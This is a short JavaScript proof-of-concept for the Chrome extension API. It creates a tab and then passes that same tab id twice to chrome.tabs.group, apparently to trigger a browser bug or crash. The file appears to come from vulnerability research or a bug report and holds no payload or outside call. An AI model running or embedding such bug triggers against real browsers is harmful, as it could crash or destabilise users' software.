

async function poc(){


  
  try {
  chrome.tabs.create({windowId:undefined, index:0}, function(tab) {
      chrome.tabs.group({tabIds:[tab.id,tab.id]}, function(groupId) {})
    
  });
  } catch(e) {}
  
      
  }
  
  poc();
  